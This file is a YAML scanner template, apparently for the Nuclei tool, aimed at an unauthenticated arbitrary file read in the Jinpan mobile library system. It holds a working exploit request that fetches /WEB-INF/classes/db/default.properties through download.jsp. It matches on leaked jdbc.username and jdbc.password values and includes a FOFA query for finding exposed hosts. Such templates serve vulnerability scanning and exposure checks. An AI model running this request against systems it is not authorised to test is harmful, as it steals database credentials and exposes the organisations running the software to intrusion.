http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - jdbc.username=
            - jdbc.password=
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/db/default.properties HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
id: jinpanyidong-download_jsp-File-reading
info:
    author: Superhero
    description: |-
        fofa: app="金盘软件-金盘移动图书馆系统"
        金盘移动图书馆系统download.jsp接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞读取服务器任意文件，从而获取大量敏感信息。
    name: 金盘移动图书馆系统download.jsp存在任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/InHee_e8nTgmrh-eVNV5nQ
    severity: high
    tags:
        - File reading
